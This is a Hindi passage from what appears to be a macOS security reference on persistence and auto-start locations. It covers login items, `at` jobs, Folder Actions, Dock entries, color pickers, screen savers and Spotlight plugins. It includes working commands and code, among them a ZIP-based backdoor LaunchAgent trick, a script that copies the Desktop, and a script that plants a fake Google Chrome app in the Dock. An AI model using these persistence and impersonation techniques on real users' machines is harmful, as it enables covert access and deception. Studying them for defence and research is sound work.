Bundled launch plist के लिए, `BundleProgram` को **app bundle root के सापेक्ष** resolve करें (उदाहरण के लिए `Contents/MacOS/Helper`), जैसा कि [Apple की Service Management migration guidance](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos) में निर्दिष्ट है। Research Mac पर केवल-पढ़ने योग्य `/Applications` inventory में 14 bundled helper entries और पाँच `BundleProgram` declarations मिलीं; पाँचों targets resolve हुए, और दो user-writability check में पास हुए। इस check से यह साबित **नहीं** होता कि इनमें से कोई helper registered या enabled है, signature validation के बाद executable है, या sandbox से reachable है। इस Mac पर `sfltool dumpbtm` ने 150 नामित records सूचीबद्ध किए; यह निरीक्षण में सहायक है, लेकिन यह जाँच नहीं है कि हर record चल रहा है।

पुराने login items को Apple events के ज़रिए भी manage किया जा सकता है। उन्हें command line से सूचीबद्ध करना, जोड़ना और हटाना संभव है, हालाँकि जोड़ने से उपयोगकर्ता का persistent login configuration बदलता है और इसके लिए Automation approval की ज़रूरत पड़ सकती है:<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` एक implementation detail है, payload को केवल फ़ाइल लिखकर install करने की समर्थित जगह नहीं। पुराने `SMLoginItemSetEnabled` API को नए helpers के लिए `SMAppService` ने supersede कर दिया है; पेज का पुराना `/var/db/com.apple.xpc.launchd/loginitems.501.plist` path macOS 26.5.2 test machine पर मौजूद नहीं था। आधुनिक login items का आकलन करते समय किसी मानी हुई database path के बजाय registration API और system UI state का उपयोग करें।

### ZIP as Login Item

(Login Items के बारे में पिछला section देखें, यह उसका extension है)

अगर आप किसी **ZIP** फ़ाइल को **Login Item** के रूप में store करते हैं, तो **`Archive Utility`** उसे खोलेगा और अगर zip, उदाहरण के लिए, **`~/Library`** में store की गई हो और उसमें backdoor वाला Folder **`LaunchAgents/file.plist`** हो, तो वह folder बनाया जाएगा (यह default रूप से मौजूद नहीं होता) और plist उसमें जोड़ दी जाएगी। इस तरह अगली बार user के फिर से login करने पर, **plist में बताया गया backdoor execute किया जाएगा**।

एक और विकल्प यह है कि user HOME के अंदर **`.bash_profile`** और **`.zshenv`** फ़ाइलें बनाई जाएँ, ताकि अगर LaunchAgents folder पहले से मौजूद हो, तब भी यह technique काम करे।

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन आपको **`at`** **execute** करना होगा और यह **enabled** होना चाहिए
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`at`** को **execute** करना होगा और यह **enabled** होना चाहिए

#### **Description**

`at` tasks को तय समय पर execute होने वाले **one-time tasks schedule करने** के लिए बनाया गया है। cron jobs के विपरीत, `at` tasks execute होने के बाद अपने-आप हटा दिए जाते हैं। यह ध्यान रखना महत्वपूर्ण है कि ये tasks system reboot के बाद भी बने रहते हैं, जिससे कुछ स्थितियों में वे संभावित security concerns बन जाते हैं।<sup>[[16]](#references)</sup>

Bundled `com.apple.atrun.plist` में `Disabled = true` है, लेकिन launchd प्रभावी enabled/disabled overrides को अलग से रखता है। macOS 26.5.2 test machine पर, `launchctl print-disabled system` ने `com.apple.atrun` को **enabled** बताया, जबकि bundled key ऐसा नहीं कहती। यह दावा करने से पहले effective state जाँचें कि `at` jobs चलेंगी:

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

एक administrator, `launchctl` का उपयोग करके disabled `atrun` service को enable कर सकता है; नीचे दिया गया ऐतिहासिक उदाहरण system service की स्थिति बदलता है और इसे research Mac पर **नहीं** चलाया गया था:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

यह 1 घंटे में एक फ़ाइल बनाएगा:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

`atq` का उपयोग करके job queue जांचें:

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

ऊपर हम दो scheduled jobs देख सकते हैं। हम `at -c JOBNUMBER` का उपयोग करके job की जानकारी प्रिंट कर सकते हैं।

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> यदि AT tasks enabled नहीं हैं, तो बनाए गए tasks execute नहीं होंगे।

**job files** `/private/var/at/jobs/` पर मिलती हैं।

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

फ़ाइलनाम में queue, job number और उसे चलाने का निर्धारित समय शामिल होता है। उदाहरण के लिए, `a0001a019bdcd2` को देखें।

- `a` - यह queue है
- `0001a` - hex में job number, `0x1a = 26`
- `019bdcd2` - hex में समय। यह epoch से बीते मिनटों को दर्शाता है। `0x019bdcd2` दशमलव में `26991826` है। इसे 60 से गुणा करने पर `1619509560` मिलता है, जो `GMT: 2021. अप्रैल 27., मंगलवार 7:46:00` है।

अगर हम job फ़ाइल प्रिंट करें, तो हमें पता चलता है कि इसमें वही जानकारी है जो `at -c` से मिली थी।

### Calendar में फ़ाइल खोलने के अलर्ट

- **लिखने का लक्ष्य:** कोई executable app bundle या दूसरी फ़ाइल जिसे Calendar event के custom **Open file** alert में **पहले से चुना गया हो**। Alert बनाने या संपादित करने के लिए Calendar के ज़रिए उस calendar event तक पहुँच या किसी स्वीकृत calendar data source की आवश्यकता होती है; किसी मनमानी फ़ाइल में लिखने से alert नहीं बनता।
- **ट्रिगर:** उस Mac पर alert का निर्धारित समय, जहाँ Calendar event को प्रोसेस करता है। Recurring event इस कार्रवाई को दोहरा सकता है। [Apple की मौजूदा Calendar guide](https://support.apple.com/guide/calendar/icl1012/mac) macOS 26 में **Custom → Open file** alert विकल्प की पुष्टि करती है।
- **निष्पादन की पहचान और शर्तें:** Calendar चुनी गई फ़ाइल को signed-in user के लिए उसके associated application में खोलता है। App bundle लॉन्च करने पर उसका code उस user के रूप में चल सकता है, लेकिन यह Gatekeeper, quarantine और macOS की अन्य जाँचों पर निर्भर करता है। कोई सामान्य script फ़ाइल शायद केवल editor में खुले; सिर्फ़ उसका extension code execution का प्रमाण नहीं है।

किसी संभावित फ़ाइल का सुरक्षित आकलन करने के लिए Calendar में event का alert और चुनी गई फ़ाइल की permissions देखें। यह तरीका Apple की guide के आधार पर दर्ज किया गया था और research Mac पर **नहीं** चलाया गया, क्योंकि इसे जाँचने के लिए live calendar में बदलाव करना और desktop event का इंतज़ार करना पड़ता। Disposable account में केवल marker वाला app bundle चुनकर, निकट भविष्य का Open file alert सेट करके, उसके launch की पुष्टि करके, फिर event और app को हटाकर जाँच की जा सकती है।

### macOS पर Shortcuts automations

- **लिखने का लक्ष्य:** कोई executable फ़ाइल जिसे shortcut की action में **पहले से refer किया गया हो**, या कोई मौजूदा shortcut जिसे अधिकृत user संपादित कर सके। कोई मनमानी `.shortcut` फ़ाइल या undocumented Shortcuts database में लिखना, automation register करने का समर्थित तरीका नहीं है।
- **ट्रिगर और पहचान:** पहले से configured और enabled automation event, जैसे समय या app event, signed-in user के लिए shortcut चलाता है। [Apple की मौजूदा Mac automation guide](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) समर्थित events की सूची देती है, बताती है कि automation कब बिना पूछे चल सकता है, और trigger हटाने का तरीका समझाती है। [Apple की Shortcuts privacy guide](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) में script actions के लिए **Allow Running Scripts** आवश्यक है; अलग-अलग actions फिर भी permissions माँग सकती हैं।

यह write-to-execution path **सिर्फ़ तभी लागू होता है जब मौजूदा action किसी writable target को load करे**। UI के ज़रिए नया automation बनाने से live settings बदलती हैं; research Mac पर ऐसा करने की कोशिश नहीं की गई। Disposable account में owner ऐसा time-of-day shortcut configure कर सकता है जिसकी script `/tmp/ht-shortcuts-marker` को छुए, आवश्यक permissions enable कर सकता है, event के बाद marker की पुष्टि कर सकता है, और फिर automation, shortcut और marker हटा सकता है।

### Automator actions और Quick Actions

- **लिखने के लक्ष्य:** action bundles के लिए `~/Library/Automator/*.action` (user) और `/Library/Automator/*.action` (administrator)। Saved Quick Action workflow आम तौर पर `~/Library/Services/*.workflow` में रखा जाता है; user द्वारा चुना गया वास्तविक workflow path जाँचें। [Apple का Automator framework reference](https://developer.apple.com/documentation/automator) action खोजने वाली directories की सूची देता है।
- **ट्रिगर:** Automator चलने पर उपलब्ध action bundles load करता है, लेकिन किसी action का task तभी चलता है जब उसका उपयोग करने वाला workflow execute हो। Quick Action तब चलता है जब user उसे Finder, Services या किसी अन्य दिखाए गए menu से चुनता है। Folder Action workflow तब चलता है जब उसके **पहले से attached** folder में items जोड़े जाते हैं; Calendar Alarm workflow event के समय चलता है। [Apple के workflow types](https://support.apple.com/guide/automator/aut7cac58839/mac) इन events में अंतर बताते हैं। केवल action या workflow लिखने से कोई folder attach नहीं होता और न ही कोई calendar event schedule होता है।
- **निष्पादन की पहचान और शर्तें:** workflow चलाने वाला account; Automator या उसे invoke करने वाले app को action load करना होगा और मौजूदा code-signing या privacy जाँचों में उसे अनुमति मिलनी होगी। किसी active workflow द्वारा पहले से refer किए गए writable action bundle का मामला, नया action install करने और उसके चुने जाने का इंतज़ार करने से अलग है।

Test Mac पर user के `Automator` और `Services` directories मौजूद थे; `/Library/Automator` मौजूद नहीं था। कोई live workflow बनाया, attach या execute नहीं किया गया। किसी खास load path की पुष्टि करने के लिए disposable account और केवल marker वाले action/workflow का उपयोग करें। अलग [Folder Actions](#folder-actions) section में इस event source की अधिक जानकारी है।

### Folder Actions

लेख: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
लेख: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- sandbox bypass करने में उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन Folder Actions configure करने के लिए **`System Events`** से संपर्क करने हेतु arguments के साथ `osascript` चलाने में सक्षम होना ज़रूरी है
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - इसमें कुछ बुनियादी TCC permissions हैं, जैसे Desktop, Documents और Downloads

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
  - Root आवश्यक
  - **ट्रिगर**: निर्दिष्ट folder तक पहुँच
- **`~/Library/Scripts/Folder Action Scripts`**
  - **ट्रिगर**: निर्दिष्ट folder तक पहुँच

#### Description & Exploitation

Folder Actions वे scripts हैं जो folder में बदलाव होने पर अपने-आप trigger होती हैं, जैसे items जोड़ना या हटाना, या folder window खोलना या उसका आकार बदलना। इन actions का उपयोग अलग-अलग कामों के लिए किया जा सकता है और इन्हें Finder UI या terminal commands जैसे अलग-अलग तरीकों से trigger किया जा सकता है।<sup>[[17]](#references)[[18]](#references)</sup>

Folder Actions सेट अप करने के लिए आपके पास ये विकल्प हैं:

1. [Automator](https://support.apple.com/guide/automator/welcome/mac) से Folder Action workflow बनाना और उसे service के रूप में install करना।
2. Folder के context menu में Folder Actions Setup के ज़रिए script को मैन्युअल रूप से attach करना।
3. Folder Action को programmatically सेट अप करने के लिए `System Events.app` को Apple Event messages भेजने हेतु OSAScript का उपयोग करना।
   - यह तरीका action को system में embed करने के लिए खास तौर पर उपयोगी है, जिससे persistence का एक स्तर मिलता है।

नीचे दी गई script इसका उदाहरण है कि Folder Action क्या execute कर सकता है:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

ऊपर दी गई script को Folder Actions द्वारा उपयोग योग्य बनाने के लिए, इसे compile करें:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

स्क्रिप्ट compile होने के बाद, नीचे दी गई स्क्रिप्ट चलाकर Folder Actions सेट अप करें। यह स्क्रिप्ट Folder Actions को globally enable करेगी और पहले से compiled स्क्रिप्ट को विशेष रूप से Desktop folder से जोड़ेगी।

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

setup script को इस तरह चलाएँ:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- GUI के ज़रिए यह persistence लागू करने का तरीका:

यह वह script है जिसे execute किया जाएगा:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

इसे इस कमांड से compile करें: `osacompile -l JavaScript -o folder.scpt source.js`

इसे यहाँ ले जाएँ:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

फिर, `Folder Actions Setup` ऐप खोलें, **जिस फ़ोल्डर पर आप नज़र रखना चाहते हैं उसे चुनें** और अपने मामले में **`folder.scpt`** चुनें (मेरे मामले में मैंने इसका नाम output2.scp रखा था):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

अब, अगर आप उस फ़ोल्डर को **Finder** से खोलते हैं, तो आपकी script निष्पादित होगी।

यह configuration **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** में स्थित **plist** में base64 format में संग्रहीत थी।

अब, GUI access के बिना इस persistence को तैयार करने की कोशिश करते हैं:

1. बैकअप बनाने के लिए **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist` को** `/tmp` में **कॉपी करें**:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. आपके द्वारा अभी सेट किए गए Folder Actions **हटा दें**:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

अब जब हमारा environment खाली है

3. बैकअप फ़ाइल कॉपी करें: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. इस config को लोड करने के लिए Folder Actions Setup.app खोलें: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> यह मेरे लिए काम नहीं किया, लेकिन writeup में दिए गए निर्देश यही हैं:(

### Dock शॉर्टकट

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- sandbox को bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
  - लेकिन आपके पास system में एक malicious application इंस्टॉल होना ज़रूरी है
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- `~/Library/Preferences/com.apple.dock.plist`
  - **Trigger**: जब user Dock में app पर क्लिक करता है

#### विवरण और Exploitation

Dock में दिखाई देने वाले सभी applications plist में निर्दिष्ट होते हैं: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

सिर्फ़ यह करके **एक application जोड़ना** संभव है:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

कुछ **social engineering** का उपयोग करके, आप dock में **Google Chrome** का रूप धारण कर सकते हैं और वास्तव में अपनी स्क्रिप्ट execute कर सकते हैं:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### इनपुट मेथड्स

- **लिखने का लक्ष्य:** `~/Library/Input Methods/` (उपयोगकर्ता) या `/Library/Input Methods/` (एडमिनिस्ट्रेटर) में इंस्टॉल किया गया code-bearing input-method app bundle। यह Apple की plain-text `.inputplugin` keyboard-mapping files से अलग है, जो अपने-आप में arbitrary-code payload नहीं होतीं।
- **ट्रिगर:** उपयोगकर्ता **System Settings → Keyboard → Text Input** में input source जोड़ता/सक्षम करता है और फिर उसे चुनता या इस्तेमाल करता है। केवल किसी bundle को directory में कॉपी कर देना इस बात का प्रमाण नहीं है कि macOS उसे लॉन्च करेगा। [Apple की मौजूदा Input Sources guide](https://support.apple.com/guide/mac-help/mchl84525d76/mac) sources को सक्षम करने और उनके बीच स्विच करने के बारे में बताती है; [Apple का InputMethodKit documentation](https://developer.apple.com/documentation/inputmethodkit) code-bearing input methods को कवर करता है।
- **Execution identity और gates:** यह method साइन-इन किए हुए उपयोगकर्ता के रूप में चलता है और input-method registration, code-signing तथा macOS के मौजूदा security checks के अधीन है। Writable executable वाले मौजूदा enabled methods के लिए अलग से path और signature की समीक्षा आवश्यक है।

Apple के [पुराने third-party input-method note](https://developer.apple.com/library/archive/qa/qa1810/_index.html) में पहले ही चेतावनी दी गई थी कि कुछ palette methods को इन directories में कॉपी करने से वे Input Sources में दिखाई भी नहीं देते। macOS 26.5.2 वाले research Mac पर उपयोगकर्ता की directory मौजूद है, लेकिन कोई bundle इंस्टॉल या सक्रिय नहीं था; इसलिए यह स्थानीय runtime परिणाम नहीं, बल्कि दस्तावेज़ीकृत conditional path है।

### Color Pickers

लेख: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Sandbox को bypass करने में उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - एक बहुत विशिष्ट कार्रवाई होनी ज़रूरी है
  - अंत में आप एक दूसरे sandbox में होंगे
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- `/Library/ColorPickers`
  - Root आवश्यक
  - ट्रिगर: color picker का इस्तेमाल करें
- `~/Library/ColorPickers`
  - ट्रिगर: color picker का इस्तेमाल करें

#### विवरण और Exploit

अपने code के साथ **color picker** bundle **compile करें** (उदाहरण के लिए, आप [**यह वाला इस्तेमाल कर सकते हैं**](https://github.com/viktorstrate/color-picker-plus)), उसमें एक constructor जोड़ें (जैसा कि [Screen Saver section](macos-auto-start-locations.md#screen-saver) में है) और bundle को `~/Library/ColorPickers` में कॉपी करें।<sup>[[20]](#references)</sup>

फिर, color picker ट्रिगर होने पर आपका bundle भी execute होना चाहिए।

यह इस पर निर्भर करता है कि कोई compatible app system color panel खोलकर इंस्टॉल किए गए picker को चुने। [Apple की color-panel guide](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) पुराने bundle locations का वर्णन करती है। स्थानीय path जाँच में legacy color-picker XPC service मिली, लेकिन research Mac पर कोई picker इंस्टॉल या लोड नहीं था; केवल path के आधार पर TCC bypass का निष्कर्ष न निकालें।

ध्यान दें कि आपकी library लोड करने वाली binary पर **बहुत सख्त sandbox** लागू है: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- sandbox bypass के लिए उपयोगी: **नहीं, क्योंकि आपको अपना ऐप execute करना होगा**
- TCC bypass: यह enabled extension के sandbox और permissions पर निर्भर करता है; कोई सामान्य bypass स्थापित नहीं है।

#### स्थान

- कोई खास ऐप

#### विवरण और Exploit

Finder Sync Extension वाले ऐप का उदाहरण [**यहाँ मिल सकता है**](https://github.com/D00MFist/InSync).

ऐप्स में `Finder Sync Extensions` हो सकते हैं। यह extension उस ऐप के अंदर रहता है जिसे execute किया जाएगा। इसके अलावा, extension को अपना code execute करने के लिए किसी मान्य Apple developer certificate से **signed** होना **ज़रूरी** है, इसे **sandboxed** होना चाहिए (हालाँकि, इसमें ढील देने वाले अपवाद जोड़े जा सकते हैं), और इसे इस तरह की किसी चीज़ से register करना होगा:<sup>[[21]](#references)[[22]](#references)</sup>

किसी installed extension को संबंधित Finder location या item के लिए **enabled** और invoke भी किया जाना चाहिए; मनमाना `.appex` bundle लिखना पर्याप्त नहीं है। [Apple का Finder Sync API](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) enabled state उपलब्ध कराता है। नीचे दिए गए `pluginkit` commands स्पष्ट रूप से registration और enabling दिखाते हैं, न कि केवल फ़ाइल के आधार पर auto-start। इस तरीके की documentation की समीक्षा की गई; research Mac पर कोई नया extension install या enable नहीं किया गया।

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### स्क्रीन सेवर

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- sandbox को bypass करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - लेकिन आप एक सामान्य application sandbox में पहुँच जाएँगे
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- `/System/Library/Screen Savers`
  - Root की आवश्यकता है
  - **ट्रिगर**: स्क्रीन सेवर चुनें
- `/Library/Screen Savers`
  - Root की आवश्यकता है
  - **ट्रिगर**: स्क्रीन सेवर चुनें
- `~/Library/Screen Savers`
  - **ट्रिगर**: स्क्रीन सेवर चुनें

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### विवरण और Exploit

Xcode में एक नया project बनाएँ और नया **Screen Saver** बनाने के लिए template चुनें। फिर उसमें अपना code जोड़ें, उदाहरण के लिए logs बनाने के लिए निम्नलिखित code।<sup>[[23]](#references)[[24]](#references)</sup>

इसे **Build** करें और `.saver` bundle को **`~/Library/Screen Savers`** में copy करें। फिर Screen Saver GUI खोलें और उस पर click करें; इससे बहुत सारे logs बनने चाहिए:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> ध्यान दें कि इस code को लोड करने वाले binary (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) के entitlements में **`com.apple.security.app-sandbox`** मौजूद है, इसलिए आप **common application sandbox के अंदर** होंगे।

Saver code:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Spotlight प्लगइन्स

लेख: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Sandbox को bypass करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
  - लेकिन अंत में आप एक application sandbox में होंगे
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Sandbox बहुत सीमित लगता है

#### स्थान

- `~/Library/Spotlight/`
  - **ट्रिगर**: Spotlight plugin द्वारा प्रबंधित extension वाली नई फ़ाइल बनाई जाती है।
- `/Library/Spotlight/`
  - **ट्रिगर**: Spotlight plugin द्वारा प्रबंधित extension वाली नई फ़ाइल बनाई जाती है।
  - Root आवश्यक है
- `/System/Library/Spotlight/`
  - **ट्रिगर**: Spotlight plugin द्वारा प्रबंधित extension वाली नई फ़ाइल बनाई जाती है।
  - Root आवश्यक है
- `Some.app/Contents/Library/Spotlight/`
  - **ट्रिगर**: Spotlight plugin द्वारा प्रबंधित extension वाली नई फ़ाइल बनाई जाती है।
  - नया app आवश्यक है

#### विवरण और Exploitation

Spotlight macOS का अंतर्निहित search feature है, जिसे उपयोगकर्ताओं को **अपने कंप्यूटर के डेटा तक तेज़ी से और व्यापक रूप से पहुँच** देने के लिए बनाया गया है।\
इस तेज़ search क्षमता को संभव बनाने के लिए, Spotlight एक **proprietary database** रखता है और **अधिकांश फ़ाइलों को parse** करके एक index बनाता है, जिससे फ़ाइल के नामों और उनकी सामग्री—दोनों में तेज़ी से search किया जा सकता है।<sup>[[25]](#references)</sup>

